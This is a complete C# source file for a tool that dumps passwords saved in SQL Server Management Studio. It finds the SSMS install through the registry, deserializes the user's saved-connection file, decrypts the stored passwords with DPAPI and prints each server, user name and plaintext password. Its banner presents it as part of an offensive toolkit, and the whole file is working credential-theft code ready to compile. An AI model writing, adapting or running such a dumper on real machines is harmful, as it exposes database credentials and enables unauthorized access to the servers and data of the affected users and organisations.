using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Reflection;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Collections.Specialized;
using System.Runtime.Serialization.Formatters.Binary;

public class SSMSPwd
{
    const string CANT_FIND_ASSEMBLIES = "Can't find assemblies path. Use -p to set.";

    static bool _all = false;
    static bool _issem = false;
    static int _ver = 0;
    static string _asmdir = null;
    static string _datpath = null;
    static bool _verbose = false;
    static void help()
    {
        var helpLines = new[]
        {
            "usage: ssmspwd [-f file] [-p path] [-all]",
            "-f: decrypt from specified file",
            "-p: path of SSMS installation",
            "-v: SSMS version (90, 110, 140, etc.)",
            "-a: dump all saved info (only dump password information default)",
            "-verbose: verbose mode"
        };

        Console.WriteLine(string.Join(Environment.NewLine, helpLines));

        Environment.Exit(-1);
    }
    public static void Main(string[] args)
    {
        Console.WriteLine("SQL Server Management Studio(SSMS) saved password dumper.");
        Console.WriteLine("Part of GMH's fuck Tools, Code By zcgonvh.\r\n");

        AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(LoadDepends);

        try
        {
            for (int i = 0; i < args.Length; i++)
            {
                var arg = args[i];

                if (stricmp(arg, "-a")) { _all = true; }
                else if (stricmp(arg, "-f")) { i++; _datpath = args[i]; }
                else if (stricmp(arg, "-p")) { i++; _asmdir = args[i] + "\\"; }
                else if (stricmp(arg, "-v")) { i++; _ver = int.Parse(args[i]); }
                else if (stricmp(arg, "-verbose")) { _verbose = true; }
                else { help(); }
            }
        }
        catch { help(); }
        try
        {
            if (_asmdir == null)
            {
                _asmdir = GetAsmdir();
            }
            if (_datpath == null)
            {
                _datpath = GetDatpath();
            }

            if (_asmdir == null || _datpath == null)
            {
                return;
            }

            object o = DeserializeFile(_datpath);
            List<info> infos = null;
            if (_ver == 90)
            {
                infos = DecodeStudio90(o);
            }
            else
            {
                infos = DecodeStudioHigh(o);
            }
            dumpinfo(infos);
        }
        catch (Exception ex) { Console.WriteLine("Error:{0}\r\n{1}\r\n", ex.Message, ex); }
    }

    static string[] GetVersionsToCheck()
    {
        if (_ver != 0)
        {
            return new[] { _ver.ToString() };
        }

        RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Microsoft SQL Server\");

        if (rk == null)
        {
            Console.WriteLine(CANT_FIND_ASSEMBLIES);
            if (_verbose)
            {
                Console.WriteLine("Microsoft SQL Server registry key not found.");
            }

            return new string[0];
        }

        return rk.GetSubKeyNames();
    }

    static string GetAsmdir()
    {
        string asmdir = null;

        foreach (string s in GetVersionsToCheck())
        {
            int i = 0;

            if (int.TryParse(s, out i))
            {
                if (_verbose)
                {
                    Console.WriteLine($"Checking version {i}");
                }

                string dir = Registry.GetValue($@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\{i}\Tools\ShellSEM", "InstallDir", null) as string;

                if (dir != null)
                {
                    _issem = true;
                }
                if (dir == null)
                {
                    dir = Registry.GetValue($@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\{i}\Tools\Shell", "InstallDir", null) as string;
                }
                if (dir == null)
                {
                    dir = Registry.GetValue($@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\{i}\Tools\ClientSetup", "SqlToolsPath", null) as string;
                }
                if (dir == null)
                {
                    dir = Registry.GetValue($@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\{i}\Tools\Setup", "SqlPath", null) as string;
                    if (dir != null)
                    {
                        dir += "Binn\\ManagementStudio\\";
                    }
                }
                if (dir != null)
                {
                    _ver = i; asmdir = dir; break;
                }
            }
        }

        if (asmdir == null)
        {
            Console.WriteLine(CANT_FIND_ASSEMBLIES);

            if (_verbose)
            {
                Console.WriteLine("SQL Tools directory not found in registry.");
            }

            return null;
        }

        if (_verbose)
        {
            Console.WriteLine($"Determined assembly directory: {asmdir}");
        }

        if (!new DirectoryInfo(asmdir).Exists)
        {
            asmdir = asmdir.Replace(@"\Program Files\", @"\Program Files (x86)\");
        }

        if (!new DirectoryInfo(asmdir).Exists)
        {
            Console.WriteLine(CANT_FIND_ASSEMBLIES);
            if (_verbose)
            {
                Console.WriteLine("SQL Tools directory found in registry but couldn't be located on disk.");
            }

            return null;
        }

        return asmdir;
    }

    static string GetDatPathForVersion(int version)
    {
        string appdata = Environment.GetEnvironmentVariable("appdata") + "\\";

        switch (version)
        {
            case 0:
                {
                    Console.WriteLine("Can't determine version. Please use -f to set filepath.", _ver);
                    return null;
                }
            case 90://SSMS 2005
                {
                    if (_issem)
                    {
                        return appdata + @"Microsoft\Microsoft SQL Server\90\Tools\ShellSEM\mru.dat";
                    }
                    else
                    {
                        return appdata + @"Microsoft\Microsoft SQL Server\90\Tools\Shell\mru.dat";
                    }
                }
            case 100://SSMS 2008
                {
                    return appdata + @"Microsoft\Microsoft SQL Server\100\Tools\Shell\SqlStudio.bin";
                }
            default://Others
                {
                    return appdata + @"Microsoft\SQL Server Management Studio\" + (_ver / 10).ToString("#.0#") + @"\SqlStudio.bin";
                }
        }
    }

    static string GetDatpath()
    {
        var datpath = GetDatPathForVersion(_ver);

        if (datpath == null)
        {
            return null;
        }

        if (!new FileInfo(datpath).Exists)
        {
            Console.WriteLine(datpath);
            Console.WriteLine("Unknown ver {0} or incorrectly determined version. Please use -f to set filepath or -v to specify version", _ver);
            return null;
        }

        return datpath;
    }

    static object GetObjectPrivateDicvalue(Type t, object obj, string key)
    {
        IDictionary dic = GetObjectPrivateDic(t, obj);
        return dic[key];
    }
    static IDictionary GetObjectPrivateDic(Type t, object obj)
    {
        return t.InvokeMember("_valuestorage", BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.GetField, null, obj, null) as IDictionary;
    }
    static List<info> DecodeStudio90(object obj)
    {
        Type t = obj.GetType();
        List<info> infos = new List<info>();
        IDictionary dic = t.InvokeMember("stringTable", BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.GetField, null, obj, null) as IDictionary;
        if (dic != null)
        {
            foreach (object k in dic.Keys)
            {
                string[] arr = k.ToString().Split('@');
                if (arr.Length == 5)
                {
                    string server = arr[1];
                    string type = arr[2];
                    string user = arr[3];
                    string field = arr[4];
                    info inf = null;
                    foreach (info i in infos)
                    {
                        if (i.server == server && i.user == user && i.type == type)
                        {
                            inf = i;
                            break;
                        }
                    }
                    if (inf == null)
                    {
                        inf = new info();
                        inf.server = server;
                        inf.user = user;
                        inf.type = type;
                        infos.Add(inf);
                    }
                    if (field == "Password")
                    {
                        IEnumerable data = dic[k] as IEnumerable;
                        if (data != null)
                        {
                            IEnumerator ie = data.GetEnumerator();
                            ie.MoveNext();
                            inf.pass = decodepassword(ie.Current.ToString());
                        }
                    }
                }
            }
        }
        return infos;
    }
    static List<info> DecodeStudioHigh(object o)
    {
        List<info> infos = new List<info>();
        Type t = o.GetType().BaseType;
        o = GetObjectPrivateDicvalue(t, o, "SSMS");
        o = GetObjectPrivateDicvalue(t, o, "ConnectionOptions");
        o = GetObjectPrivateDicvalue(t, o, "ServerTypes");
        IDictionary dic = o as IDictionary;
        foreach (object k in dic.Keys)
        {
            o = dic[k];
            IEnumerable data = GetObjectPrivateDicvalue(t, o, "Servers") as IEnumerable;
            if (data != null)
            {
                IEnumerator ie = data.GetEnumerator();
                while (ie.MoveNext())
                {
                    IEnumerable data2 = GetObjectPrivateDicvalue(t, ie.Current, "Connections") as IEnumerable;
                    if (data2 != null)
                    {
                        IEnumerator ie2 = data2.GetEnumerator();
                        while (ie2.MoveNext())
                        {
                            info inf = new info();
                            inf.server = GetObjectPrivateDicvalue(t, ie.Current, "Instance") as string;
                            inf.type = Convert.ToInt32(GetObjectPrivateDicvalue(t, ie.Current, "AuthenticationMethod")).ToString();
                            inf.pass = decodepassword(GetObjectPrivateDicvalue(t, ie2.Current, "Password") as string);
                            inf.user = GetObjectPrivateDicvalue(t, ie2.Current, "UserName") as string;
                            infos.Add(inf);
                        }
                    }
                }
            }
        }
        return infos;
    }
    static string getauthtype(string type)
    {
        if (type == null) { return "(not set)"; }
        switch (type)
        {
            case "0": { return "Windows"; }
            case "1": { return "SQL Server"; }
            default: { return "Unknown"; }
        }
    }
    static void dumpinfo(List<info> infos)
    {
        foreach (info inf in infos)
        {
            if (_all || inf.pass != null)
            {
                Console.WriteLine("server: {0}\r\nUser: {1}\r\nType: {2}\r\nPassword: {3}\r\n", getnotnullstr(inf.server), getnotnullstr(inf.user), getnotnullstr(getauthtype(inf.type)), getnotnullstr(inf.pass));
            }
        }
    }
    static string getnotnullstr(string s)
    {
        if (string.IsNullOrEmpty(s)) { return "(not set)"; }
        return s;
    }
    static string decodepassword(string enc)
    {
        try
        {
            if (String.IsNullOrEmpty(enc)) { return null; }
            return Encoding.Unicode.GetString(ProtectedData.Unprotect(Convert.FromBase64String(enc), new byte[] { }, DataProtectionScope.LocalMachine));
        }
        catch (Exception ex) { return "(decrypt data err: " + ex.Message.Replace("\r\n", "") + ")\r\n"; }
    }

    static Assembly LoadDepends(object sender, ResolveEventArgs args)
    {
        AssemblyName asn = new AssemblyName(args.Name);
        try
        {
            string dllpath = _asmdir + asn.Name + ".dll";

            if (_verbose)
            {
                Console.WriteLine($"Loading assembly {dllpath}");
            }

            Assembly asm = Assembly.LoadFile(dllpath);
            return asm;
        }
        catch (Exception ex)
        {
            if (asn.Name == "System")
            {
                Console.WriteLine("please re-compile this program with .net 4.0 .");
            }
            else
            {
                Console.WriteLine(ex);
            }
            Environment.Exit(-1);
        }
        return null;
    }
    static object DeserializeFile(string path)
    {
        using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(path)))
        {
            mem.Position = 0;
            BinaryFormatter bf = new BinaryFormatter();
            return bf.Deserialize(mem);
        }
    }
    static bool stricmp(string s1, string s2) { return string.Equals(s1, s2, StringComparison.OrdinalIgnoreCase); }
    class info
    {
        public string server = null;
        public string user = null;
        public string pass = null;
        public string type = null;
    }
}